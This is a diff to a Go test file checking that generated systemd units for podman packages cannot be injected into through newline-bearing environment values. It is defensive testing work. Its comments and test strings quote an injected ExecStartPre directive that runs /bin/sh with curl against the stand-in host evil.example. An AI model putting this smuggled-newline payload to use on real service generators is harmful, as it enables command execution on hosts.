@@ -71,10 +71,37 @@ func TestQuoteCommandArgUnchangedForOrdinaryArgs(t *testing.T) {
 	}
 }
 
-// The end-to-end shape: a generated unit must never carry a directive that the
-// package did not legitimately produce. Every ExecStart continuation line ends
-// in a backslash, so counting `ExecStartPre=` occurrences catches an injected
-// one regardless of where in the argument list it was smuggled.
+// countDirectives counts lines that actually START a directive with the given
+// key — not occurrences of the text.
+//
+// The distinction is the whole assertion. Once the newline is stripped, the
+// payload survives as text INSIDE the quoted -e value:
+//
+//	-e 'FOO=harmlessExecStartPre=/bin/sh -c '\''curl ...'\'''
+//
+// which is one argument to podman and exactly what should happen — the package
+// asked for a silly environment value and got one. Counting the substring would
+// call that an injection; counting directives sees that systemd parses one.
+// A continuation line (the previous line ended in a backslash) can never start
+// a directive, so those are skipped.
+func countDirectives(content, key string) int {
+	n := 0
+	continued := false
+	for raw := range strings.SplitSeq(content, "\n") {
+		wasContinued := continued
+		continued = strings.HasSuffix(raw, "\\")
+		if wasContinued {
+			continue
+		}
+		if strings.HasPrefix(strings.TrimSpace(raw), key) {
+			n++
+		}
+	}
+	return n
+}
+
+// The end-to-end shape: a generated unit must never carry a DIRECTIVE the
+// package did not legitimately produce.
 func TestGeneratePackageUnitsCannotBeInjectedIntoViaEnvironment(t *testing.T) {
 	clean := GeneratePackageUnits(PackageUnitConfig{
 		RepoName:    "core",
@@ -94,18 +121,25 @@ func TestGeneratePackageUnitsCannotBeInjectedIntoViaEnvironment(t *testing.T) {
 		},
 	})
 
-	if n := strings.Count(injected.Service.Content, "ExecStartPre="); n != strings.Count(clean.Service.Content, "ExecStartPre=") {
+	got := countDirectives(injected.Service.Content, "ExecStartPre=")
+	want := countDirectives(clean.Service.Content, "ExecStartPre=")
+	if got != want {
 		t.Fatalf("injected unit has %d ExecStartPre directives, clean unit has %d:\n%s",
-			n, strings.Count(clean.Service.Content, "ExecStartPre="), injected.Service.Content)
+			got, want, injected.Service.Content)
 	}
-	if strings.Contains(injected.Service.Content, "curl http://evil.example") {
-		// The payload text itself may legitimately survive as part of the
-		// value; what must not survive is it starting its own directive.
-		for line := range strings.SplitSeq(injected.Service.Content, "\n") {
-			if strings.HasPrefix(strings.TrimSpace(line), "ExecStartPre=/bin/sh -c 'curl") {
-				t.Fatalf("payload became its own directive:\n%s", injected.Service.Content)
-			}
+
+	// The payload text may legitimately survive inside the quoted value — the
+	// package asked for a silly environment value and got one. What must not
+	// survive is it starting its own directive.
+	for raw := range strings.SplitSeq(injected.Service.Content, "\n") {
+		if strings.HasPrefix(strings.TrimSpace(raw), "ExecStartPre=/bin/sh -c 'curl") {
+			t.Fatalf("payload became its own directive:\n%s", injected.Service.Content)
 		}
+	}
+
+	// And no raw newline escaped into the file at all, which is the mechanism.
+	if strings.Contains(injected.Service.Content, "harmless\n") {
+		t.Fatalf("the injected newline survived into the unit:\n%s", injected.Service.Content)
 	}
 }
 
